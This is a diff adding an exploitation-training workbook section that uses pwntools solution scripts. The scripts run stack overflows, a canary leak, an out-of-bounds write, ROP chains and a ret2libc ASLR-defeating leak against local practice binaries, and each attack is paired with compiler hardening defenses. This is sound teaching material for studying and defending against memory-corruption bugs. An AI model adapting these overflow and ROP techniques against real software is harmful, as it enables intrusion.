+reaches a /benign/ end — a =win()= function, the lab's =flag.txt=, or a leaked
+address — and every offensive step is paired with the defense that stops it. The
+final assembly is always yours to write in /Scratch/; the solutions hand you the
+pieces and the method. There is no shellcode and no shell here: the point is to
+understand control-flow hijacking and how to prevent it.
+
+You'll drive the binaries with *pwntools*, the standard exploit-development
+toolkit: =process()= to run one, =p64()= to pack an address, =cyclic()= to find
+an offset, =ELF()= to read symbols, =ROP()= to find gadgets, =checksec= to read
+a binary's defenses. Everything is in this one VM.
+
+Rebuild the practice binaries any time:
+
+#+begin_src bash :results output
+bash /opt/nixlab/workbook-setup.sh --reset >/dev/null && ls /opt/binexp/bin && echo rebuilt
+#+end_src
+
+** TODO E26.1 — Anatomy of a stack frame
+Before breaking anything, see what you're breaking. In =gdb=, look at =ret2win='s
+=vuln()=: find its 64-byte buffer, the saved frame pointer, and the saved return
+address above them on the stack. Confirm the distance from the buffer to the
+return address is 72 bytes.
+You'll meet: the call stack, =rbp=/=rsp=, saved RIP, =gdb= =break= / =run= /
+=x/gx= / =info frame=, local-buffer layout, =checksec=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+When a function is called, the =call= pushes the return address; the prologue
+saves the old =rbp=. Locals (your buffer) live /below/ that, at lower addresses.
+So writing forward past the buffer marches toward the saved =rbp= and then the
+saved return address. =gdb='s =info frame= prints "saved rip" and its address;
+compare it to the buffer's address to get the distance. =pwn checksec BIN= shows
+which defenses are on.
+*** Solution
+#+begin_src bash :results output
+pwn checksec /opt/binexp/bin/ret2win 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | grep -E 'Arch|RELRO|Stack|NX|PIE'
+gdb -q -batch \
+  -ex 'break vuln' -ex 'run </dev/null' \
+  -ex 'print $rsp' -ex 'info frame' \
+  /opt/binexp/bin/ret2win 2>&1 | grep -iE 'rip|rbp|saved|stack level' | head -6
+#+end_src
+"saved rip" is the address the function will jump to on return. Everything in
+this track is about putting an address /you/ choose there.
+
+** TODO E26.2 — Return to a function (ret2win)
+=ret2win= never calls =win()=. Make it run anyway, by overflowing =vuln='s
+buffer so the saved return address becomes =win='s address. Use =cyclic= to
+measure the offset instead of guessing it.
+You'll meet: =gets= overflow, =cyclic= / =cyclic_find=, =ELF().symbols=,
+=p64=, =process().sendline=.
+*** Scratch
+#+begin_src python :results output
+
+#+end_src
+*** Hint
+Send a unique =cyclic(200)= pattern, let it crash, and =cyclic_find= the four
+bytes that landed in the return slot — that's your offset (72 here). Then the
+payload is =b"A"*72 + p64(win)=, where =win= comes from =ELF(...).symbols["win"]=
+since the binary isn't PIE and its addresses are fixed.
+*** Solution
+#+begin_src python :results output
+from pwn import *
+context.arch='amd64'; context.log_level='error'
+e = ELF("/opt/binexp/bin/ret2win")
+offset = cyclic_find(cyclic(200)[72:76])      # the methodical way to get 72
+p = process(e.path); p.recvuntil(b"name?\n")
+p.sendline(b"A"*offset + p64(e.symbols["win"]))
+print("offset:", offset)
+print(p.recvall(timeout=2).decode(errors="replace").strip().splitlines()[-1])
+#+end_src
+The defense is one exercise away (E26.8): a stack canary placed just before the
+saved return address turns this exact overflow into a safe abort.
+
+** TODO E26.3 — Out-of-bounds read: leak a secret
+=leak= is built /with/ a stack canary, so a blind overflow dies. But it prints
+your input back with =%s=, which keeps going until it hits a zero byte. Overwrite
+the canary's one zero byte and the =printf= spills the rest of the canary to you.
+Read it out.
+You'll meet: over-read, =%s= and NUL termination, the canary's null low byte,
+=recvuntil= / =recvn=, =u64=.
+*** Scratch
+#+begin_src python :results output
+
+#+end_src
+*** Hint
+The canary sits 72 bytes past the buffer and its lowest byte is always =0x00=
+(so a normal =%s= stops there and leaks nothing). Send exactly 72 bytes plus one
+non-zero byte: that overwrites the null, so =printf= prints your bytes, the one
+you added, and then the canary's upper 7 bytes before the next null. Reassemble
+with =u64(b"\x00" + those_7_bytes)=.
+*** Solution
+#+begin_src python :results output
+from pwn import *
+context.arch='amd64'; context.log_level='error'
+p = process("/opt/binexp/bin/leak"); p.recvuntil(b"echo> ")
+p.send(b"A"*72 + b"B")
+p.recvuntil(b"A"*72 + b"B")
+canary = u64(b"\x00" + p.recvn(7))
+print("leaked canary:", hex(canary))
+print("low byte is 0x00:", canary & 0xff == 0)
+#+end_src
+Now you /know/ the canary. In an overflow that writes it back into the same spot,
+the check passes and you ride straight through — the move E26.2 couldn't make.
+Writing that is yours; against a forking server the canary stays constant across
+connections, which is exactly why such services get brute-forced byte by byte.
+
+** TODO E26.4 — Out-of-bounds write: write-what-where
+=oobw= reads an index and a value and does =table[idx] = val= with no bounds
+check. =table= has 8 slots; a =guard= variable sits just past it. Find the index
+that lands on =guard=, set it to the magic value, and reach =win()=.
+You'll meet: array bounds, a write primitive, adjacent-variable corruption,
+negative and out-of-range indices, probing an offset.
+*** Scratch
+#+begin_src python :results output
+
+#+end_src
+*** Hint
+=table[idx]= with attacker-controlled =idx= is a write to =&table[0] + idx*8= —
+anywhere in memory, forward or backward. =guard= lives just above the array, so
+a small positive index past the end hits it. Probe indices 8, 9, 10… with the
+value =0xc0ffee= (=12648430=) until =win()= fires. This "write-what-where" is the
+heart of heap and format-string exploitation too.
+*** Solution
+#+begin_src python :results output
+from pwn import *
+context.log_level='error'
+for idx in range(8, 12):
+    p = process("/opt/binexp/bin/oobw"); p.recvuntil(b"idx val?\n")
+    p.sendline(f"{idx} {0xc0ffee}".encode())
+    out = p.recvall(timeout=2).decode(errors="replace")
+    if "WIN" in out:
+        print(f"index {idx} hit the guard ->", out.strip().splitlines()[-1]); break
+    p.close()
+#+end_src
+The defenses here are plain: check every index, and let AddressSanitizer
+(=gcc -fsanitize=address=, track 20) catch the out-of-bounds write in testing.
+
+** TODO E26.5 — Why injected code won't run (NX)
+A classic attack put bytes on the stack and jumped to them. Show why that no
+longer works: the stack is mapped writable but /not/ executable. This is the
+wall that forces attackers to reuse existing code (E26.6).
+You'll meet: =NX=/DEP, =W^X=, the =GNU_STACK= segment, =readelf -l=,
+=checksec=, data-execution prevention.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+Memory is either writable or executable, rarely both (=W^X=). The =GNU_STACK=
+program header carries the stack's permissions: =RW= means non-executable (NX
+on), =RWE= would mean an executable stack. With NX on, jumping to shellcode you
+wrote on the stack faults — so exploitation pivots to /return-oriented
+programming/, stitching together code that is already there.
+*** Solution
+#+begin_src bash :results output
+pwn checksec /opt/binexp/bin/ropme 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | grep NX
+readelf -lW /opt/binexp/bin/ropme | awk '/GNU_STACK/{print "GNU_STACK:", ($0 ~ /RWE/)?"RWE (executable!)":"RW (NX on, no code on the stack)"}'
+#+end_src
+NX is why the rest of this track reuses the program's own instructions instead
+of injecting new ones.
+
+** TODO E26.6 — Return-oriented programming: call a function with an argument
+=ropme= has a =print_flag(key)= that reveals the flag only when =key ==
+0xc0ffee=. With NX on you can't inject code, so build a short ROP chain: a
+gadget to load =rdi= (the first argument), the key, then =print_flag=. Find the
+gadget with =ROP()=.
+You'll meet: gadgets, =pop rdi ; ret=, the SysV calling convention (=rdi= =rsi=
+=rdx=…), =ROP().find_gadget=, chaining returns, =ROPgadget=.
+*** Scratch
+#+begin_src python :results output
+
+#+end_src
+*** Hint
+A /gadget/ is a short run of instructions ending in =ret=. =pop rdi ; ret= pops
+the next stack value into =rdi= then "returns" to whatever you placed after it —
+so you chain gadgets by stacking addresses. The layout is: pad to the return
+slot, =p64(pop_rdi)=, =p64(0xc0ffee)=, =p64(print_flag)=. =ROP(elf).find_gadget=
+locates the gadget; =ROPgadget --binary ropme= lists them all.
+*** Solution
+#+begin_src python :results output
+from pwn import *
+context.arch='amd64'; context.log_level='error'
+e = ELF("/opt/binexp/bin/ropme"); rop = ROP(e)
+pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
+chain = b"A"*72 + p64(pop_rdi) + p64(0xc0ffee) + p64(e.symbols["print_flag"])
+p = process(e.path); p.send(chain)
+print("pop rdi gadget @", hex(pop_rdi))
+print(p.recvall(timeout=2).decode(errors="replace").strip().splitlines()[-1])
+#+end_src
+That is ROP in miniature: no new code, just the program's own pieces rearranged.
+Real chains string dozens of gadgets to set up and call anything.
+
+** TODO E26.7 — ret2libc and defeating ASLR with a leak
+=aslr= gives you nothing useful to call — the interesting code is in the C
+library, whose address is randomized every run (ASLR). The standard answer: use
+a ROP chain to /leak/ a libc address, which tells you where the whole library
+landed. Leak =puts='s real address by calling =puts(puts@got)=, return to
+=main= for a second try, and compute the library base.
+You'll meet: the PLT/GOT, =puts@got=, ASLR, computing a library base from a
+leak, =ELF().libc=, returning to =main= for a second stage.
+*** Scratch
+#+begin_src python :results output
+
+#+end_src
+*** Hint
+The GOT holds the resolved runtime addresses of library functions. Calling
+=puts(puts@got)= makes the program print =puts='s real address; subtract =puts='s
+known offset within libc and you have the library's base — defeating ASLR.
+Returning to =main= afterward lets you send a second payload now that you know
+where everything is. The chain: pad, =pop rdi=, =puts@got=, =puts@plt=, =main=.
+*** Solution
+#+begin_src python :results output
+from pwn import *
+context.arch='amd64'; context.log_level='error'
+e = ELF("/opt/binexp/bin/aslr"); rop = ROP(e)
+pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
+p = process(e.path); p.recvuntil(b"go\n")
+p.send(b"A"*72 + p64(pop_rdi) + p64(e.got["puts"]) + p64(e.plt["puts"]) + p64(e.symbols["main"]))
+leak = u64(p.recvline().strip().ljust(8, b"\x00"))
+libc = ELF(e.libc.path, checksec=False)
+base = leak - libc.symbols["puts"]
+print("leaked puts @", hex(leak))
+print("libc base    @", hex(base), "(page-aligned:", base % 0x1000 == 0, ")")
+p.close()
+#+end_src
+With the base known, every libc function and string is at a computable address —
+the second-stage chain that uses them is yours to write. This leak-then-pivot is
+the shape of most modern exploits, and it's exactly why the leak in E26.3 and the
+address disclosure here matter so much.
+
+** TODO E26.8 — The defenses, end to end
+Switch to the defender. Take =ret2win='s source and rebuild it with each modern
+protection, watching the E26.2 attack die. Then read the protections off a binary
+with =checksec= and =readelf=, and name which exercise each one defeats.
+You'll meet: =-fstack-protector=, =-pie -fPIE= + ASLR, =-Wl,-z,relro,-z,now=,
+=-D_FORTIFY_SOURCE=2=, =-fcf-protection= (Intel CET / shadow stack), =checksec=.
+*** Scratch
+#+begin_src bash :results output
+
+#+end_src
+*** Hint
+Each flag blocks a different step: the /canary/ (=-fstack-protector-all=) detects
+the overflow before the function returns; /PIE/ + ASLR randomize =win='s address
+so a fixed payload misses; /CET/ (=-fcf-protection=full=) keeps a shadow copy of
+return addresses and aborts on mismatch; /RELRO/ (=-z relro -z now=) locks the
+GOT; /FORTIFY/ adds length checks to =strcpy=-family calls. =pwn checksec= reports
+them. These are the compiler defaults for a reason — E26.2 only worked because
+the practice binary turned them off.
+*** Solution
+#+begin_src bash :results output
+cd /opt/binexp/bin
+gcc -w -fstack-protector-all -no-pie -fcf-protection=none -g ret2win.c -o /tmp/r_canary 2>/dev/null
+printf 'canary build vs the E26.2 payload: '
+python3 -c 'from pwn import *; context.log_level="error"; p=process("/tmp/r_canary"); p.recvuntil(b"name?\n"); p.sendline(b"A"*72+p64(ELF("ret2win",checksec=False).symbols["win"])); print("stack smashing detected" if b"smashing" in p.recvall(timeout=2) else "NOT blocked")'
+gcc -w -fstack-protector-all -pie -fPIE -Wl,-z,relro,-z,now -fcf-protection=full -D_FORTIFY_SOURCE=2 -O2 ret2win.c -o /tmp/r_hard 2>/dev/null
+echo "--- fully hardened build, per checksec:"
+pwn checksec /tmp/r_hard 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | grep -E 'RELRO|Stack|NX|PIE'
+rm -f /tmp/r_canary /tmp/r_hard
+#+end_src
+Canary defeats E26.2's blind overflow; PIE/ASLR defeat the fixed-address jump in
+E26.2 and force the leak in E26.7; NX forces ROP (E26.6); CET's shadow stack
+breaks ROP's returns; RELRO stops GOT overwrites. Defense in depth: each layer
+costs the attacker another primitive.
+
+** TODO E26.9 — A managed language can still bite: SBCL and raw memory
+Even a garbage-collected Lisp can reach past its safety net through the foreign-
+function interface. With SBCL's =sb-alien=, allocate raw C memory, write and read
+it by hand, and read past the end you asked for — the same out-of-bounds access
+as E26.3, in a language that usually prevents it. The lesson: the FFI boundary is
+where memory-safety guarantees end.
+You'll meet: =sb-alien:make-alien=, =deref=, =free-alien=, =sb-sys= system-area
+pointers, the safe/unsafe boundary, why FFI needs the same care as C.
+*** Scratch
+#+begin_src lisp :results output
+
+#+end_src
+*** Hint
+=(make-alien (unsigned 8) N)= allocates =N= raw bytes outside the Lisp heap, with
+no bounds checking. =(deref ptr i)= reads or writes byte =i=; nothing stops =i=
+from running past =N=, so you read whatever happens to be there — an information
+leak, exactly like E26.3. Ordinary Lisp data (vectors, strings) /is/ bounds-
+checked; only the FFI escapes that. Always =free-alien= what you allocate, and
+treat every =sb-alien=/=sb-sys= call with C-level caution.
+*** Solution
+#+begin_src lisp :results output
+(let ((buf (sb-alien:make-alien (unsigned 8) 8)))
+  (dotimes (i 8) (setf (sb-alien:deref buf i) (+ 65 i)))   ; write 'A'..'H'
+  (format t "in bounds:  ~a~%"
+          (loop for i below 8 collect (sb-alien:deref buf i)))
+  (format t "OOB read at index 64 (uninitialized memory): ~a~%"
+          (sb-alien:deref buf 64))                          ; past the 8 bytes
+  (sb-alien:free-alien buf))
+(let ((v (make-array 8 :element-type '(unsigned-byte 8))))
+  (handler-case (aref v 64)                                 ; safe Lisp: checked
+    (error (e) (format t "safe vector refuses OOB: ~a~%" (type-of e)))))
+#+end_src
+The alien buffer let you read far past its end; the ordinary Lisp vector raised
+an error instead. Memory safety is a property of the /interface/, not the
+language name on the box — the FFI is where C's rules, and C's bugs, come back.
+
 
 * Capstone — one question, nine ways
 :PROPERTIES:
